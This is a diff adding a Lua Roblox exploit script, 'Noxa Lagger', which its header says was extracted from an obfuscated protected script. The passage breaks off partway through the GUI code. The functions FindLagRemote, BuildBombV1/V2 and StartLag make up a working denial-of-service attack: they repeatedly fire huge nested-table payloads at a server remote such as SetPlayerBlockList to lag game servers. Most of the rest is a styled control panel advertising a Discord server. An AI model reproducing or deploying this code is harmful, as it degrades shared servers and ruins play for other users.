@@ -1,0 +1,1974 @@
+--[[
+    Noxa Lagger - Clean Source
+    Extracted & cleaned from Luarmor / Luraph protected script
+]]
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local Players           = game:GetService("Players")
+local TweenService      = game:GetService("TweenService")
+local UserInputService  = game:GetService("UserInputService")
+local RunService        = game:GetService("RunService")
+local HttpService       = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
+
+----------------------------------------------------------------
+-- Config (saved to NoxaLaggerConfig.json)
+----------------------------------------------------------------
+local Config = {
+    keybind         = Enum.KeyCode.B,
+    power           = 97000,
+    preset          = "V1",
+    active          = false,
+    posSX           = 0.5,
+    posOX           = 0,
+    posSY           = 0.5,
+    posOY           = 0,
+    phoneScale      = 1,
+    customizeScale  = 1,
+    themeName       = "Noxa",
+    bgImage         = "rbxassetid://90453834580322",
+    bgVisibility    = 40,
+    _thread         = nil,
+    _bomb           = nil,
+    _startedAt      = 0,
+    version         = "V1",
+}
+
+----------------------------------------------------------------
+-- Load / Save
+----------------------------------------------------------------
+local function LoadConfig()
+    pcall(function()
+        if not isfile or not isfile("NoxaLaggerConfig.json") then return end
+        local data = HttpService:JSONDecode(readfile("NoxaLaggerConfig.json"))
+        if type(data) ~= "table" then return end
+
+        if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
+            Config.keybind = Enum.KeyCode[data.Keybind]
+        end
+        if type(data.power) == "number" then
+            Config.power = math.clamp(math.floor(data.power), 1, 999999)
+        end
+        if data.preset == "V1" or data.preset == "V2" then Config.preset = data.preset end
+        if data.version == "V1" or data.version == "V2" then Config.version = data.version end
+
+        for _, k in ipairs({"posSX","posOX","posSY","posOY","phoneScale","customizeScale"}) do
+            if type(data[k]) == "number" then Config[k] = data[k] end
+        end
+        if type(data.themeName) == "string" then Config.themeName = data.themeName end
+        if type(data.bgImage) == "string" then Config.bgImage = data.bgImage end
+        if type(data.bgVisibility) == "number" then
+            Config.bgVisibility = math.clamp(math.floor(data.bgVisibility / 5 + 0.5) * 5, 0, 100)
+        end
+    end)
+end
+
+local function SaveConfig()
+    pcall(function()
+        if type(writefile) ~= "function" then return end
+        writefile("NoxaLaggerConfig.json", HttpService:JSONEncode({
+            Keybind         = Config.keybind.Name,
+            power           = Config.power,
+            preset          = Config.preset,
+            version         = Config.version,
+            posSX           = Config.posSX,
+            posOX           = Config.posOX,
+            posSY           = Config.posSY,
+            posOY           = Config.posOY,
+            phoneScale      = Config.phoneScale,
+            customizeScale  = Config.customizeScale,
+            themeName       = Config.themeName,
+            bgImage         = Config.bgImage,
+            bgVisibility    = Config.bgVisibility,
+        }))
+    end)
+end
+
+LoadConfig()
+
+----------------------------------------------------------------
+-- Find lag remote
+----------------------------------------------------------------
+local LagRemote = nil
+
+local function FindLagRemote()
+    if LagRemote and LagRemote.Parent then return LagRemote end
+
+    local candidates = {
+        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
+        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
+        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
+    }
+
+    for _, fn in ipairs(candidates) do
+        local ok, res = pcall(fn)
+        if ok and res and (res:IsA("RemoteEvent") or res:IsA("UnreliableRemoteEvent") or res:IsA("RemoteFunction")) then
+            LagRemote = res
+            return res
+        end
+    end
+
+    -- fallback search
+    local roots = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
+    for _, root in ipairs(roots) do
+        if root then
+            for _, d in ipairs(root:GetDescendants()) do
+                if d:IsA("RemoteEvent") or d:IsA("UnreliableRemoteEvent") or d:IsA("RemoteFunction") then
+                    local n = d.Name:lower()
+                    if n:find("block") or n:find("steal") or n:find("accept") or n:find("report") or n:find("player") or n:find("lag") then
+                        LagRemote = d
+                        return d
+                    end
+                end
+            end
+        end
+    end
+
+    -- last resort: any remote
+    for _, root in ipairs(roots) do
+        if root then
+            for _, d in ipairs(root:GetDescendants()) do
+                if d:IsA("RemoteEvent") or d:IsA("UnreliableRemoteEvent") then
+                    LagRemote = d
+                    return d
+                end
+            end
+        end
+    end
+    return nil
+end
+
+----------------------------------------------------------------
+-- Bomb builders (the actual lag payloads)
+----------------------------------------------------------------
+local function BuildBombV1()
+    local bomb = {{}}
+    local cur = bomb[1]
+    for i = 1, 30 do
+        local t = {}
+        table.insert(cur, t)
+        cur = t
+    end
+    local list = {}
+    for i = 1, 2000 do table.insert(list, bomb) end
+    return list
+end
+
+local function BuildBombV2()
+    local bomb = {{}}
+    local cur = bomb[1]
+    for i = 1, 8 do
+        local t = {}
+        table.insert(cur, t)
+        cur = t
+    end
+    local list = {}
+    for i = 1, 180 do table.insert(list, bomb) end
+    return list
+end
+
+local function GetBomb()
+    return Config.version == "V1" and BuildBombV1() or BuildBombV2()
+end
+
+local function GetDelay()
+    return Config.version == "V1" and 0.34 or 0.17
+end
+
+----------------------------------------------------------------
+-- Lag control
+----------------------------------------------------------------
+local function StopLag()
+    Config.active = false
+    if Config._thread then
+        pcall(function() coroutine.close(Config._thread) end)
+        Config._thread = nil
+    end
+    Config._bomb = nil
+end
+
+local function StartLag()
+    StopLag()
+    Config.active = true
+    Config._startedAt = os.clock()
+    Config._bomb = GetBomb()
+
+    Config._thread = coroutine.create(function()
+        while Config.active do
+            pcall(function()
+                settings().Network.IncomingReplicationLag = 0
+                -- some executors support this
+                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+            end)
+
+            local remote = FindLagRemote()
+            if remote then
+                local bomb = Config._bomb
+                local ok = pcall(function()
+                    if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                        remote:FireServer(bomb)
+                    elseif remote:IsA("RemoteFunction") then
+                        remote:InvokeServer(bomb)
+                    end
+                end)
+                if not ok then
+                    LagRemote = nil
+                end
+                task.wait(GetDelay())
+            end
+            task.wait(0.045)
+        end
+    end)
+    coroutine.resume(Config._thread)
+end
+
+local function ToggleLag()
+    if Config.active then
+        StopLag()
+    else
+        StartLag()
+    end
+    return Config.active
+end
+
+----------------------------------------------------------------
+-- Themes
+----------------------------------------------------------------
+local Themes = {
+    {name = "Noxa",    accent = Color3.fromRGB(125, 180, 255), a2 = Color3.fromRGB(190, 230, 255), ad = Color3.fromRGB(24, 60, 140)},
+    {name = "Aqua",    accent = Color3.fromRGB(96, 220, 235),  a2 = Color3.fromRGB(176, 245, 255), ad = Color3.fromRGB(16, 100, 116)},
+    {name = "Ocean",   accent = Color3.fromRGB(70, 180, 255),  a2 = Color3.fromRGB(150, 215, 255), ad = Color3.fromRGB(20, 80, 132)},
+    {name = "Glacier", accent = Color3.fromRGB(170, 225, 255), a2 = Color3.fromRGB(225, 245, 255), ad = Color3.fromRGB(40, 110, 150)},
+    {name = "Sunset",  accent = Color3.fromRGB(255, 166, 100), a2 = Color3.fromRGB(255, 214, 196), ad = Color3.fromRGB(168, 58, 40)},
+    {name = "Rose",    accent = Color3.fromRGB(255, 96, 150),  a2 = Color3.fromRGB(255, 180, 200), ad = Color3.fromRGB(120, 20, 68)},
+    {name = "Fuji",    accent = Color3.fromRGB(180, 150, 255), a2 = Color3.fromRGB(255, 170, 216), ad = Color3.fromRGB(102, 48, 158)},
+    {name = "Ember",   accent = Color3.fromRGB(255, 120, 92),  a2 = Color3.fromRGB(255, 182, 150), ad = Color3.fromRGB(140, 40, 30)},
+    {name = "Matcha",  accent = Color3.fromRGB(178, 222, 140), a2 = Color3.fromRGB(210, 246, 190), ad = Color3.fromRGB(78, 120, 60)},
+    {name = "Mint",    accent = Color3.fromRGB(150, 230, 200), a2 = Color3.fromRGB(206, 236, 220), ad = Color3.fromRGB(40, 96, 80)},
+    {name = "Void",    accent = Color3.fromRGB(140, 110, 255), a2 = Color3.fromRGB(140, 120, 255), ad = Color3.fromRGB(104, 20, 116)},
+}
+
+local Accent = Themes[1].accent
+local A2     = Themes[1].a2
+
+-- Colors
+local ColorBg     = Color3.fromRGB(16, 14, 22)
+local ColorCard   = Color3.fromRGB(22, 30, 44)
+local ColorBtn    = Color3.fromRGB(28, 36, 52)
+local ColorText   = Color3.fromRGB(232, 243, 255)
+local ColorMuted  = Color3.fromRGB(136, 156, 180)
+local ColorWhite  = Color3.fromRGB(255, 255, 255)
+local ColorPink   = Color3.fromRGB(255, 120, 220)
+
+local TweenFast   = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local TweenMed    = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local TweenBack   = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+
+----------------------------------------------------------------
+-- Helpers
+----------------------------------------------------------------
+local function Create(class, props)
+    local inst = Instance.new(class)
+    if props then
+        for k, v in pairs(props) do
+            if k ~= "Parent" then
+                pcall(function() inst[k] = v end)
+            end
+        end
+        if props.Parent then inst.Parent = props.Parent end
+    end
+    return inst
+end
+
+local function Corner(parent, radius)
+    return Create("UICorner", {CornerRadius = UDim.new(0, radius or 12), Parent = parent})
+end
+
+local function Stroke(parent, thickness)
+    return Create("UIStroke", {
+        Color = Color3.fromRGB(0, 0, 0),
+        Thickness = thickness or 1.1,
+        Transparency = 0.55,
+        Parent = parent
+    })
+end
+
+local function Tween(obj, info, goals)
+    local t = TweenService:Create(obj, info, goals)
+    t:Play()
+    return t
+end
+
+-- accent trackers so themes update everything
+local AccentTargets = {}
+local function TrackAccent(inst, prop)
+    table.insert(AccentTargets, {inst = inst, prop = prop or "BackgroundColor3"})
+end
+
+----------------------------------------------------------------
+-- Effects
+----------------------------------------------------------------
+local FX = {}
+
+FX.sakura = function(parent, count, z)
+    count = count or 10
+    for i = 1, count do
+        local petal = Create("Frame", {
+            Size = UDim2.new(0, 6, 0, 8),
+            Position = UDim2.new(math.random(), 0, math.random(), 0),
+            BackgroundColor3 = Color3.fromRGB(140 + i%5*20, 200 + i%3*15, 255),
+            BackgroundTransparency = 0.3,
+            BorderSizePixel = 0,
+            Rotation = i * 30,
+            ZIndex = z or 2,
+            Parent = parent
+        })
+        Corner(petal, 4)
+
+        task.spawn(function()
+            local speed = 0.0025 + i%5 * 0.001
+            while petal and petal.Parent do
+                local y = petal.Position.Y.Scale + speed
+                local x = petal.Position.X.Scale + math.sin(tick() + i) * 0.002
+                if y > 1.08 then
+                    y = -0.05
+                    x = math.random() * 0.95
+                end
+                petal.Position = UDim2.new(math.clamp(x, -0.05, 1), 0, y, 0)
+                petal.Rotation = petal.Rotation + 0.8
+                task.wait(0.03)
+            end
+        end)
+    end
+end
+
+FX.shadow = function(parent, size, transparency)
+    return Create("ImageLabel", {
+        Name = "Shadow",
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, 0, 0.5, 4),
+        Size = UDim2.new(1, size or 36, 1, size or 36),
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://6014261993",
+        ImageColor3 = Color3.fromRGB(0, 0, 0),
+        ImageTransparency = transparency or 0.4,
+        ScaleType = Enum.ScaleType.Slice,
+        SliceCenter = Rect.new(49, 49, 450, 450),
+        ZIndex = math.max(0, (parent.ZIndex or 1) - 1),
+        Parent = parent
+    })
+end
+
+FX.ripple = function(btn)
+    btn.ClipsDescendants = true
+    btn.MouseButton1Click:Connect(function()
+        local ripple = Create("Frame", {
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.5, 0),
+            Size = UDim2.new(0, 0, 0, 0),
+            BackgroundColor3 = ColorWhite,
+            BackgroundTransparency = 0.6,
+            BorderSizePixel = 0,
+            ZIndex = 30,
+            Parent = btn
+        })
+        Corner(ripple, 99)
+        Tween(ripple, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Size = UDim2.new(1.6, 0, 1.6, 0),
+            BackgroundTransparency = 1
+        })
+        task.delay(0.5, function()
+            if ripple then ripple:Destroy() end
+        end)
+    end)
+end
+
+FX.shake = function(obj, intensity, times)
+    if not obj or not obj.Parent then return end
+    intensity = intensity or 3
+    times = times or 4
+    local original = obj.Position
+    task.spawn(function()
+        for i = 1, times do
+            obj.Position = UDim2.new(
+                original.X.Scale,
+                original.X.Offset + (math.random()-0.5)*2*intensity,
+                original.Y.Scale,
+                original.Y.Offset + (math.random()-0.5)*2*intensity
+            )
+            task.wait(0.02)
+        end
+        obj.Position = original
+    end)
+end
+
+FX.strokeFlash = function(stroke, thickness, transparency)
+    if not stroke then return end
+    local oldT = stroke.Thickness
+    local oldTr = stroke.Transparency
+    stroke.Thickness = thickness or oldT + 2.5
+    stroke.Transparency = transparency or 0.05
+    Tween(stroke, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Thickness = oldT,
+        Transparency = oldTr
+    })
+end
+
+FX.press = function(parent)
+    local scale = parent:FindFirstChildOfClass("UIScale")
+    if not scale then
+        scale = Instance.new("UIScale")
+        scale.Scale = 1
+        scale.Parent = parent
+    end
+    scale.Scale = 0.92
+    Tween(scale, TweenBack, {Scale = 1})
+end
+
+FX.clickFX = function(btn, stroke)
+    FX.ripple(btn)
+    btn.MouseButton1Click:Connect(function()
+        FX.press(btn)
+        FX.shake(btn, 2.5, 4)
+        if stroke then FX.strokeFlash(stroke, 3, 0.05) end
+    end)
+    btn.MouseEnter:Connect(function()
+        if stroke then
+            Tween(stroke, TweenFast, {Transparency = 0.2, Thickness = stroke.Thickness < 2 and 1.6 or stroke.Thickness})
+        end
+    end)
+    btn.MouseLeave:Connect(function()
+        if stroke then
+            Tween(stroke, TweenFast, {Transparency = 0.5, Thickness = 1.2})
+        end
+    end)
+end
+
+----------------------------------------------------------------
+-- Destroy old GUI
+----------------------------------------------------------------
+pcall(function()
+    local old = PlayerGui:FindFirstChild("NoxaLagger")
+    if old then old:Destroy() end
+end)
+
+----------------------------------------------------------------
+-- Main ScreenGui
+----------------------------------------------------------------
+local ScreenGui = Create("ScreenGui", {
+    Name = "NoxaLagger",
+    IgnoreGuiInset = true,
+    ResetOnSpawn = false,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    DisplayOrder = 132,
+    Parent = PlayerGui
+})
+
+if not ScreenGui.Parent then
+    pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
+end
+
+----------------------------------------------------------------
+-- Billboard (floating tag above head)
+----------------------------------------------------------------
+local Billboard = Instance.new("BillboardGui")
+Billboard.Name = "NoxaLaggerBillboard"
+Billboard.Adornee = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") or LocalPlayer.CharacterAdded:Wait()
+Billboard.Size = UDim2.new(0, 300, 0, 45)
+Billboard.StudsOffset = Vector3.new(0, 6, 0)
+Billboard.AlwaysOnTop = true
+Billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Billboard.Parent = ScreenGui
+
+local BillFrame = Create("Frame", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundColor3 = Color3.fromRGB(10, 16, 26),
+    BackgroundTransparency = 0.15,
+    BorderSizePixel = 0,
+    Parent = Billboard
+})
+Corner(BillFrame, 12)
+
+local BillStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.5,
+    Transparency = 0.3,
+    Parent = BillFrame
+})
+TrackAccent(BillStroke, "Color")
+
+local BillText = Create("TextLabel", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Text = "LAGGER: DISCORD.GG/NOXADUELS",
+    TextColor3 = Accent,
+    TextSize = 20,
+    Font = Enum.Font.FredokaOne,
+    TextStrokeTransparency = 0.3,
+    Parent = BillFrame
+})
+TrackAccent(BillText, "TextColor3")
+
+local BillGrad = Instance.new("UIGradient")
+BillGrad.Rotation = 90
+BillGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Accent),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 220)),
+    ColorSequenceKeypoint.new(1, Accent)
+})
+BillGrad.Parent = BillText
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    local head = char:WaitForChild("Head", 5)
+    if head then Billboard.Adornee = head end
+end)
+
+task.spawn(function()
+    while Billboard and Billboard.Parent do
+        local pulse = (math.sin(tick() * 1.5) + 1) * 0.5
+        BillText.TextSize = 18 + pulse * 4
+        BillStroke.Transparency = 0.2 - pulse * 0.15
+        BillFrame.BackgroundTransparency = 0.1 + (1 - pulse) * 0.1
+        task.wait(0.04)
+    end
+end)
+
+----------------------------------------------------------------
+-- Phone Body (main window)
+----------------------------------------------------------------
+local Phone = Create("Frame", {
+    Name = "PhoneBody",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(Config.posSX, Config.posOX, Config.posSY, Config.posOY),
+    Size = UDim2.new(0, 400, 0, 450),
+    BackgroundColor3 = Color3.fromRGB(16, 24, 36),
+    BorderSizePixel = 0,
+    Visible = true,
+    Parent = ScreenGui
+})
+Corner(Phone, 28)
+
+Create("UIGradient", {
+    Rotation = 125,
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 150, 190)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(16, 24, 36)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 164, 205))
+    }),
+    Parent = Phone
+})
+
+FX.shadow(Phone, 36, 0.38)
+
+local PhoneScale = Create("UIScale", {Scale = Config.phoneScale, Parent = Phone})
+
+local Inner = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(1, -12, 1, -12),
+    BackgroundColor3 = ColorBg,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Parent = Phone
+})
+Corner(Inner, 22)
+
+local InnerStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.1,
+    Transparency = 0.5,
+    Parent = Inner
+})
+TrackAccent(InnerStroke, "Color")
+
+local Content = Create("Frame", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundColor3 = ColorBg,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Parent = Inner
+})
+Corner(Content, 22)
+
+----------------------------------------------------------------
+-- Background image
+----------------------------------------------------------------
+local BgImage = Create("ImageLabel", {
+    Name = "BgAsset",
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Image = Config.bgImage,
+    ImageTransparency = 1 - Config.bgVisibility / 100,
+    ImageColor3 = Color3.fromRGB(160, 200, 235),
+    ScaleType = Enum.ScaleType.Crop,
+    Parent = Content
+})
+Corner(BgImage, 22)
+if Config.bgImage == "" then BgImage.Visible = false end
+
+-- sakura particles
+local SakuraLayer = Create("Frame", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    ClipsDescendants = true,
+    ZIndex = 2,
+    Parent = Content
+})
+FX.sakura(SakuraLayer, 10, 2)
+
+----------------------------------------------------------------
+-- Header
+----------------------------------------------------------------
+local Header = Create("Frame", {
+    Size = UDim2.new(1, 0, 0, 50),
+    Position = UDim2.new(0, 0, 0, 20),
+    BackgroundTransparency = 1,
+    ZIndex = 5,
+    Parent = Content
+})
+
+local Title = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(0.9, 0, 0, 32),
+    BackgroundTransparency = 1,
+    Text = "NOXA LAGGER",
+    TextColor3 = Accent,
+    TextSize = 22,
+    Font = Enum.Font.FredokaOne,
+    ZIndex = 6,
+    Parent = Header
+})
+TrackAccent(Title, "TextColor3")
+
+Create("UIGradient", {
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Accent),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 220)),
+        ColorSequenceKeypoint.new(1, ColorWhite)
+    }),
+    Parent = Title
+})
+
+local MinimizeBtn = Create("TextButton", {
+    Position = UDim2.new(1, -36, 0, 8),
+    Size = UDim2.new(0, 26, 0, 26),
+    BackgroundColor3 = ColorBtn,
+    BackgroundTransparency = 0.1,
+    Text = "-",
+    TextColor3 = ColorText,
+    TextSize = 16,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 6,
+    Parent = Header
+})
+Corner(MinimizeBtn, 999)
+local MinStroke = Stroke(MinimizeBtn, 1)
+FX.clickFX(MinimizeBtn, MinStroke)
+
+MinimizeBtn.MouseEnter:Connect(function()
+    Tween(MinimizeBtn, TweenFast, {BackgroundColor3 = Color3.fromRGB(28, 56, 84), TextColor3 = Accent})
+end)
+MinimizeBtn.MouseLeave:Connect(function()
+    Tween(MinimizeBtn, TweenFast, {BackgroundColor3 = ColorBtn, TextColor3 = ColorText})
+end)
+
+----------------------------------------------------------------
+-- Accent line under header
+----------------------------------------------------------------
+local AccentLine = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 72),
+    Size = UDim2.new(0.82, 0, 0, 1.5),
+    BackgroundColor3 = Accent,
+    BorderSizePixel = 0,
+    ZIndex = 5,
+    Parent = Content
+})
+TrackAccent(AccentLine, "BackgroundColor3")
+AccentLine.Size = UDim2.new(0, 0, 0, 1)
+Tween(AccentLine, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0.82, 0, 0, 1.5)
+})
+
+----------------------------------------------------------------
+-- Main content area
+----------------------------------------------------------------
+local Main = Create("Frame", {
+    Position = UDim2.new(0, 12, 0, 80),
+    Size = UDim2.new(1, -24, 1, -88),
+    BackgroundTransparency = 1,
+    ZIndex = 5,
+    Parent = Content
+})
+
+----------------------------------------------------------------
+-- Status circle
+----------------------------------------------------------------
+local StatusHolder = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 4),
+    Size = UDim2.new(0, 130, 0, 130),
+    BackgroundTransparency = 1,
+    ZIndex = 6,
+    Parent = Main
+})
+
+local StatusOuter = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(0, 120, 0, 120),
+    BackgroundColor3 = Color3.fromRGB(13, 20, 31),
+    BorderSizePixel = 0,
+    ZIndex = 6,
+    Parent = StatusHolder
+})
+Corner(StatusOuter, 999)
+
+local StatusStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 2.2,
+    Transparency = 0.55,
+    Parent = StatusOuter
+})
+TrackAccent(StatusStroke, "Color")
+
+local GlowRing = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(0, 120, 0, 120),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    ZIndex = 5,
+    Parent = StatusHolder
+})
+Corner(GlowRing, 999)
+local GlowStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 5,
+    Transparency = 0.88,
+    Parent = GlowRing
+})
+TrackAccent(GlowStroke, "Color")
+
+local StatusInner = Create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(0, 100, 0, 100),
+    BackgroundColor3 = Color3.fromRGB(8, 13, 22),
+    BorderSizePixel = 0,
+    ZIndex = 7,
+    Parent = StatusOuter
+})
+Corner(StatusInner, 999)
+local InnerStroke2 = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1,
+    Transparency = 0.6,
+    Parent = StatusInner
+})
+TrackAccent(InnerStroke2, "Color")
+
+local StatusLabel = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 14),
+    Size = UDim2.new(1, -8, 0, 12),
+    BackgroundTransparency = 1,
+    Text = "OFFLINE",
+    TextColor3 = ColorMuted,
+    TextSize = 9,
+    Font = Enum.Font.GothamBold,
+    ZIndex = 10,
+    Parent = StatusInner
+})
+
+local VersionLabel = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 2),
+    Size = UDim2.new(1, -10, 0, 34),
+    BackgroundTransparency = 1,
+    Text = Config.version,
+    TextColor3 = ColorWhite,
+    TextSize = 28,
+    Font = Enum.Font.GothamBlack,
+    ZIndex = 10,
+    Parent = StatusInner
+})
+local VersionScale = Create("UIScale", {Scale = 1, Parent = VersionLabel})
+
+Create("UIGradient", {
+    Rotation = 90,
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, ColorWhite),
+        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(190, 230, 255)),
+        ColorSequenceKeypoint.new(1, Accent)
+    }),
+    Parent = VersionLabel
+})
+
+local TimerLabel = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 1),
+    Position = UDim2.new(0.5, 0, 1, -12),
+    Size = UDim2.new(1, -8, 0, 12),
+    BackgroundTransparency = 1,
+    Text = "00:00",
+    TextColor3 = ColorMuted,
+    TextSize = 10,
+    Font = Enum.Font.GothamMedium,
+    ZIndex = 10,
+    Parent = StatusInner
+})
+
+-- pulse animation
+task.spawn(function()
+    while StatusOuter and StatusOuter.Parent do
+        local pulse = (math.sin(tick() * 1.8) + 1) * 0.5
+        local activeMul = Config.active and 1 or 0
+        StatusStroke.Transparency = 0.55 - pulse * 0.25 - activeMul * 0.12
+        StatusStroke.Thickness = 2.2 + pulse * 0.8 + activeMul * 1
+        StatusStroke.Color = Accent
+        local size = 120 + pulse * 6 + activeMul * 8
+        GlowRing.Size = UDim2.fromOffset(size, size)
+        GlowStroke.Transparency = 0.9 - pulse * 0.15 - activeMul * 0.1
+        GlowStroke.Color = Accent
+        if AccentLine then
+            AccentLine.BackgroundTransparency = 0.1 + (1 - pulse) * 0.2
+            AccentLine.Size = UDim2.new(0.78 + pulse * 0.04, 0, 0, 1.5)
+        end
+        VersionScale.Scale = 1 + pulse * 0.025 + activeMul * 0.04
+        task.wait(0.04)
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if Config.active then
+        local t = math.floor(os.clock() - Config._startedAt)
+        TimerLabel.Text = string.format("%02d:%02d", math.floor(t / 60), t % 60)
+    end
+end)
+
+----------------------------------------------------------------
+-- Version input
+----------------------------------------------------------------
+local VersionBox = Create("TextBox", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 140),
+    Size = UDim2.new(1, 0, 0, 34),
+    BackgroundColor3 = ColorBtn,
+    BorderSizePixel = 0,
+    Text = Config.version,
+    TextColor3 = ColorText,
+    TextSize = 13,
+    Font = Enum.Font.GothamBold,
+    ClearTextOnFocus = false,
+    PlaceholderText = "V1 / V2",
+    PlaceholderColor3 = ColorMuted,
+    ZIndex = 6,
+    Parent = Main
+})
+Corner(VersionBox, 12)
+local VersionStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.2,
+    Transparency = 0.5,
+    Parent = VersionBox
+})
+TrackAccent(VersionStroke, "Color")
+local VersionBoxScale = Create("UIScale", {Scale = 1, Parent = VersionBox})
+
+VersionBox.Focused:Connect(function()
+    Tween(VersionStroke, TweenFast, {Transparency = 0.1, Thickness = 2.2})
+    Tween(VersionBoxScale, TweenBack, {Scale = 1.03})
+    Tween(VersionBox, TweenFast, {BackgroundColor3 = Color3.fromRGB(32, 48, 70)})
+end)
+VersionBox.FocusLost:Connect(function()
+    Tween(VersionStroke, TweenMed, {Transparency = 0.5, Thickness = 1.2})
+    Tween(VersionBoxScale, TweenMed, {Scale = 1})
+    Tween(VersionBox, TweenFast, {BackgroundColor3 = ColorBtn})
+    local match = string.upper(VersionBox.Text):match("^(V[12])$")
+    if match then
+        Config.version = match
+        VersionLabel.Text = match
+        VersionBox.Text = match
+        if Config.active then
+            StopLag()
+            task.wait(0.1)
+            StartLag()
+        end
+        SaveConfig()
+        FX.strokeFlash(StatusStroke, 4.5, 0.05)
+    else
+        VersionBox.Text = Config.version
+    end
+end)
+
+Create("TextLabel", {
+    Position = UDim2.new(0, 0, 0, 178),
+    Size = UDim2.new(1, 0, 0, 12),
+    BackgroundTransparency = 1,
+    Text = "VERSION",
+    TextColor3 = ColorPink,
+    TextSize = 9,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6,
+    Parent = Main
+})
+
+----------------------------------------------------------------
+-- V1 / V2 buttons
+----------------------------------------------------------------
+local VersionRow = Create("Frame", {
+    Position = UDim2.new(0, 0, 0, 194),
+    Size = UDim2.new(1, 0, 0, 34),
+    BackgroundTransparency = 1,
+    ZIndex = 6,
+    Parent = Main
+})
+Create("UIListLayout", {
+    FillDirection = Enum.FillDirection.Horizontal,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+    Padding = UDim.new(0, 8),
+    Parent = VersionRow
+})
+
+local VersionButtons = {}
+
+local function UpdateVersionButtons()
+    for k, btn in pairs(VersionButtons) do
+        local selected = Config.version == k
+        Tween(btn, TweenFast, {
+            BackgroundColor3 = selected and Accent or ColorBtn,
+            TextColor3 = selected and Color3.fromRGB(8, 13, 32) or ColorText
+        })
+    end
+end
+
+for _, ver in ipairs({"V1", "V2"}) do
+    local btn = Create("TextButton", {
+        Size = UDim2.new(0, 120, 0, 34),
+        BackgroundColor3 = ColorBtn,
+        BorderSizePixel = 0,
+        Text = ver,
